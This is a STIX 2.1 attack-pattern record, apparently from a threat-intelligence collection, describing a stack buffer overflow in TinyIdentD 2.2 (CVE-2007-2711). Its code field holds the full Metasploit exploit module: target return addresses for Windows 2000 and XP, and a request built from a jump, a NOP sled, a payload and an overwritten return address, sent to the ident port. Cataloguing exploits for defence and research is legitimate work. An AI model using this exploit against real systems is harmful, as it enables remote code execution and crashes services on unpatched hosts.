{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d74254ae-28fa-4f0c-99bf-d488163bdff3",
    "created": "2024-08-14T16:46:50.144933Z",
    "modified": "2024-08-14T16:46:50.144937Z",
    "name": "TinyIdentD 2.2 Stack Buffer Overflow",
    "description": " This module exploits a stack based buffer overflow in TinyIdentD version 2.2. If we send a long string to the ident service we can overwrite the return address and execute arbitrary code. Credit to Maarten Boone. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/tiny_identd_overflow.rb",
            "external_id": "tiny_identd_overflow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-2711"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'TinyIdentD 2.2 Stack Buffer Overflow',\n        'Description' => %q{\n          This module exploits a stack based buffer overflow in TinyIdentD\n          version 2.2.\n          If we send a long string to the ident service we can overwrite the\n          return address and execute arbitrary code. Credit to Maarten Boone.\n        },\n        'Author' =>\n        [\n          'Maarten Boone', # discovery\n          'Jacopo Cervini <acaro[at]jervus.it>', # metasploit\n        ],\n        'References' =>\n          [\n            ['BID', '23981'],\n            ['CVE', '2007-2711'],\n            ['EDB', '3925'],\n            ['OSVDB', '36053'],\n          ],\n        'Payload' =>\n          {\n            'Space' => 450,\n            'BadChars' => \"\\x00\\x0d\\x20\\x0a\"\n          },\n        'Platform' => 'win',\n        'Targets' =>\n          [\n            ['Windows 2000 Server SP4 - English', { 'Ret' => 0x7c2d15e7 } ], # call esi\n            ['Windows 2000 Pro All - English', { 'Ret' => 0x75023411 } ], # call esi ws2help.dll\n            ['Windows 2000 Pro All - Italian', { 'Ret' => 0x74fd2b81 } ], # call esi ws2help.dll\n            ['Windows 2000 Pro All - French', { 'Ret' => 0x74fa2b22 } ], # call esi ws2help.dll\n            ['Windows XP SP0/1 - English', { 'Ret' => 0x71aa1a97 } ], # call esi ws2help.dll\n            ['Windows XP SP2 - English', { 'Ret' => 0x71aa1b22 } ], # call esi ws2help.dll\n            ['Windows XP SP2 - Italian', { 'Ret' => 0x77f46eda } ], # call esi\n          ],\n        'Notes' =>\n          {\n            'Reliability' => [ REPEATABLE_SESSION ],\n            'Stability' => [ CRASH_SERVICE_DOWN ]\n          },\n        'Privileged' => false,\n        'DisclosureDate' => '2007-05-14'\n      )\n    )\n\n    register_options([ Opt::RPORT(113) ])\n  end\n\n  def exploit\n    connect\n\n    print_status(\"Trying #{target.name} using address at #{'0x%.8x' % target.ret} ...\")\n\n    request = \"\\xeb\\x20, 28 : USERID : UNIX :\"\n    request << make_nops(491 - payload.encoded.length)\n    request << payload.encoded\n    request << [ target.ret ].pack('V')\n    request << \"\\n\"\n\n    sock.put(request)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-05-14",
    "x_mitre_platforms": [
        "win'"
    ]
}